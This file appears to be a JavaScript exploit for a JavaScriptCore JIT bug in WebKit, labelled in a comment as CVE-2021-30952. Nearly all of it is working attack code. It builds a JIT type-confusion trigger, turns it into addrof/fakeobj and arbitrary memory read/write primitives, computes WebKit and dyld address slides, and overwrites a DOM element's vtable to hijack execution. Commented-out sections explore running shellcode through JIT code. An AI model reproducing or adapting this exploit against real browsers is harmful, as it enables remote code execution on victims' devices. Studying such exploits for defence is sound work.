const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) {
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}


function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function millis(ms)
{
    var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
        //Simply wait
    }
}

var shellcodeFunc = MakeJitCompiledFunction();


function pwn() {
    log("[+] setting up stuff...");
    const scratchBuf = new ArrayBuffer(64);
    const u32View = new Uint32Array(scratchBuf);
    const f64View = new Float64Array(scratchBuf);

    const randRange = (lo, hi) => {
        lo = Math.ceil(lo);
        hi = Math.ceil(hi);
        return Math.floor(Math.random() * (hi - lo) + lo);
    };
    const nanTag = randRange(1, 8) << 8 | randRange(1, 8) << 4 | randRange(1, 8) << 0;
    const nanPayload = randRange(1, 0xFFFFFF);
    const boxIndex = (arrayIndex, elementIndex) => {
        if (arrayIndex > 0xFFFF || arrayIndex < 0) throw new Error("");
        if (elementIndex > 0xFF || elementIndex < 0) throw new Error("");
        u32View[1] = nanTag << 20 | 4 << 16 | arrayIndex;
        u32View[0] = elementIndex << 24 | nanPayload;
        const result = f64View[0];
        if (isNaN(result)) throw new Error("");
        return result;
    };
    let t = new Array(400);  // Main array, 400 elements
    t.fill([]);
    let currentTarget = null;
    let triggerValue = 0;
    let triggerReplace = null;
    let triggerBool = false;
    let triggerFlag1 = -1;
    let triggerFlag2 = -1;
    // Coruna CVE-2021-30952 trigger
    function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
        const target_array = t;
        let idx = e;
        const b = f;
        const k = n;
        const d = i;
        const len = target_array.length;
        for (let t = 0; t < 2; t++) {
            if (b === true) {
                if(!(idx === -2147483648)) return -1
                    } else if (!(idx > 2147483647)) return -2;
            if (k === 0) idx = 0;
            if (idx < len) {
                if (k !== 0) idx -= 2147483647-7;
                if (idx < 0) return -3;
                // target_array[idx] = 2.66289667873244264257e-314;
                let t = target_array[idx]; // read the leaked data from t[201] array
                if (d) {
                    target_array[idx] = r;
                    
                    if (u === 0) t = other_array[nested_idx][0];
                    else other_array[nested_idx][0] = oob_value
                        }
                return t
            }
            if( t > 0 ) break
        }
        return -4
    }
    const g = new Array(16).fill([]).map((_, r) => {
        const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
        for (const t of i) {
            t[0] = 0.1 + r;
            t["a" + r] = r;
        }
        return i;
    });
    const y = 200;
    t = t.map(((t, r) => {
        const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
        if (i[0] = .1 + r, r !== y) {
            i[0] = [];
            for (const t in i) 0 !== t && (i[t] = boxIndex(r, t))
        }
        return i
    }));
    log("[+] prepping the jit...");
    const main_target_array = t[200];
    for (let iter = 0; iter < 1000000; iter++) {
        currentTarget = main_target_array;
        triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
        triggerValue = -2147483648;     // INT32_MIN
        triggerFlag1 = true;
        triggerFlag2 = 0;
        // Call with INT32_MIN, b=true path
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
        true, g[iter % g.length], 0, iter % 2, 0.1 + iter);
        // Call with INT32_MAX, b=false path
        triggerValue = 2147483647 - iter % 3;  // INT32_MAX or close to it
        triggerFlag1 = !(1 & iter);             // alternating boolean
        triggerFlag2 = 0 + iter % 3;            // 0, 1, or 2
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
    }
    log("[+] jit'd our trigger function");
    function addrof_pre(obj) {
        t[201][2] = obj;
        let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
        return f2i(leak);
    }
    function fakeobj_pre(addr) {
        jit_me(main_target_array, -2147483648, i2f(addr), true, 1, true, g[0], 0, 0, 0)
        return t[201][2];
    }
    
    // From https://github.com/wh1te4ever/WebKit-Bug-256172
    function LeakStructureID(obj) {
        let container = {
            cellHeader: i2f(0x0108200700000000-0x02000000000000),
            butterfly: obj
        };
        let fakeObjAddr = addrof_pre(container) + 0x10;
        let fakeObj = fakeobj_pre(fakeObjAddr);
        f64[0] = fakeObj[0];
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return structureID;
    }
    
    // leak structureID
    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log(`[+] leak structureID: 0x${structureID.toString(16)}`);
    // create a fake object with victim as it's butterfly
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim
    };
    var driver = fakeobj_pre(addrof_pre(container) + 0x10);
    var unboxed = [noCoW, 13.37, 13.37];
    var boxed = [{}];
    // set victim butterfly to unboxed
    driver[1] = unboxed;
    // get unboxed butterfly
    var sharedButterfly = victim[1];
    // set victim butterfly to boxed
    driver[1] = boxed;
    // set boxed butterfly to unboxed butterfly
    victim[1] = sharedButterfly;
    // set new cellHeader
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];
    
    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];
    }
    function read64(addr) {
        driver[1] = i2f(addr + 0x10);
        return addrof(victim.prop);
    }
    function write64(addr, val) {
        driver[1] = i2f(addr + 0x10);
        victim.prop = i2f(val);
    }
    
    let buffer = new Uint32Array(2);
    buffer.fill(0x41414141);
    let addr = addrof(buffer);
    log(`[+] addr: 0x${addr.toString(16)}`);
    let bytes_addr = read64(addr + 0x10);
    log(`[+] bytes_addr: 0x${bytes_addr.toString(16)}`);
    
    log(`[+] read64 -> 0x${read64(bytes_addr).toString(16)}`);
    write64(bytes_addr, 0x42424242);
    log(`[+] read64 -> 0x${read64(bytes_addr).toString(16)}`);
    log(`[+] buffer[0]: 0x${buffer[0].toString(16)}`);
    log(`[+] buffer[1]: 0x${buffer[1].toString(16)}`);
    let vtable_addr = read64(read64(addrof(document.createElement('div')) + 0x10));
    log(`[+] vtable address: 0x${vtable_addr.toString(16)}`);
    let webkit_base = vtable_addr - 0x2ce4dd1;
    log(`[+] WebKit base address: 0x${webkit_base.toString(16)}`);
    log(`[+] read64 -> 0x${read64(webkit_base).toString(16)}`);
    let dyld_slide = webkit_base - 0x18C0D0000;
    log(`[+] dyld_slide: 0x${dyld_slide.toString(16)}`);
    let dlsym_addr = 0x1800c96e4 + dyld_slide;
    log(`[+] dlsym_addr: 0x${dlsym_addr.toString(16)}`);
    log(`[+] read64 -> 0x${read64(dlsym_addr).toString(16)}`);
    
    let element = document.createElement('div');
    log(`[+] element: ${element}`);
    let obj_ptr = read64(addrof(element) + 0x18);
    log(`[+] obj_ptr: 0x${obj_ptr.toString(16)}`);
    let real_vtable = read64(obj_ptr);
    log(`[+] real_vtable: 0x${real_vtable.toString(16)}`);
    
    let ptr = read64(real_vtable + (4 * 8));
    log(`[+] ptr: 0x${ptr.toString(16)}`);
    
    function write64_poc_internal(addr) {
        driver[1] = i2f(bytes_addr + 0x10);
        let value_prop = victim.prop;
        driver[1] = i2f(addr + 0x10);
        victim.prop = value_prop;
    }
    function write64_poc(addr, value) {
        buffer[0] = value >>> 0;
        buffer[1] = (value / 0x100000000) >>> 0;
        write64_poc_internal(addr);
    }

//    buffer[0] = 0x45464748;
//    buffer[1] = 0x41424344;
//    write64_poc_internal(real_vtable + (4 * 8));
    write64_poc(real_vtable + (4 * 8), 0x00000001ac20a76c + dyld_slide);
    write64_poc(obj_ptr + 0x20, 0xdeadbeef);

    alert(`[+] new: 0x${read64(real_vtable + (4 * 8)).toString(16)}`);
    
    alert("about to trigger...");
    element.addEventListener("click", function (e) {});
    alert("hmmmm");

    return;
  
//    // 32 bit read tests
//    let noCoW1 = 1337;
//    var u32_array = [noCoW1,1,2,3,4];
//    boxed[0] = u32_array;
//    driver[1] = unboxed[0];
//    victim[1] = sharedButterfly;
//
//    buffer[0] = 0x41424344;
//    buffer[1] = 0xffffffff;
//
//    driver[1] = i2f(bytes_addr + 0x10);
//    boxed[0] = victim.prop;
//    u32[0] = u32_array[0];
//    log(`[+] read32(bytes_addr) -> 0x${u32[0].toString(16)}`);
//    
//    driver[1] = i2f((bytes_addr + 0x4) + 0x10);
//    boxed[0] = victim.prop;
//    u32[0] = u32_array[0];
//    log(`[+] read32(bytes_addr + 0x4) -> 0x${u32[0].toString(16)}`);
//    
//    driver[1] = i2f(webkit_base + 0x10);
//    boxed[0] = victim.prop;
//    u32[0] = u32_array[0];
//    log(`[+] read32(webkit_base) -> 0x${u32[0].toString(16)}`);
//    
//    log(`[*] vtable static address: 0x${(vtable_addr - dyld_slide).toString(16)}`);
//
////    let index = 3;
////    let test_addr = vtable_addr - (index * 8);
////    let test_addr = 0x1d8ed2000 + 0xb80 + dyld_slide;
//    let test_addr = 0x1d239c000 + 0xf08 + dyld_slide;
//    //let test_addr = 0x1d239a000 + 0xeb0 + dyld_slide;
//    
//    driver[1] = i2f(test_addr + 0x10);
//    boxed[0] = victim.prop;
//    u32[0] = u32_array[0];
//    let low = u32[0];
//    
//    driver[1] = i2f((test_addr + 0x4) + 0x10);
//    boxed[0] = victim.prop;
//    u32[0] = u32_array[0];
//    let high = u32[0];
//    
//    log(`0x${high.toString(16).padStart(8, "0")}${low.toString(16).padStart(8, "0")}`)
//    log(`[+] read64 -> 0x${read64(test_addr).toString(16)}`);
//    
//    alert("a");
//    function write64_poc(addr, value) {
//        buffer[0] = value >>> 0;
//        buffer[1] = (value / 0x100000000) >>> 0;
//        driver[1] = i2f(bytes_addr + 0x10);
//        let value_prop = victim.prop;
//        driver[1] = i2f(addr + 0x10);
//        victim.prop = value_prop;
//    }
//    
//    let new_value = 0x19b94b890;
//    write64_poc(test_addr, new_value);
//    alert(`[+] read64 -> 0x${read64(test_addr).toString(16)} 0x${new_value.toString(16)}`);
//    alert("about to trigger...");
//    let u = new URL("https://example.com");
//    alert("hmmmm?");

//    var shellcodeFuncAddr = addrof(shellcodeFunc);
//    alert(`[*] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
//    
//    var executableAddr = read64(shellcodeFuncAddr + 24);
//    log(`[*] Executable instance @ ${executableAddr.toString(16)}`);
//    
//    var jitCodeAddr = read64(executableAddr + 8);
//    log(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
//    alert(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
//
////    let offsets = [0x18, 0x40, 0x50, 0x70, 0xd8, 0x110, 0x128, 0x158, 0x160, 0x170, 0x190, 0x1b8, 0x1c8, 0x1e8];
//////    let offsets = [0x18, 0x40, 0x50, 0x70, 0xd8, 0x110];
////    for (let offset of offsets) {
////        let value = read64(jitCodeAddr + offset);
////        write64(value, 0x41414141);
////        alert(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
////    }
//    // 0x110 weird
//    let offset = 0x110;
//    let value = read64(jitCodeAddr + offset);
//    alert(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
//    alert(`[+] 0x${offset.toString(16)}: 0x${read64(value).toString(16)}`);
//    write64(read64(value), 0x41424344);
//
//    shellcodeFunc();
//    alert("b");
////    for (var offset = 0; offset <= 0x200; offset += 0x8) {
////        let value = read64(jitCodeAddr + offset);
////        log(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
////
////    }
}
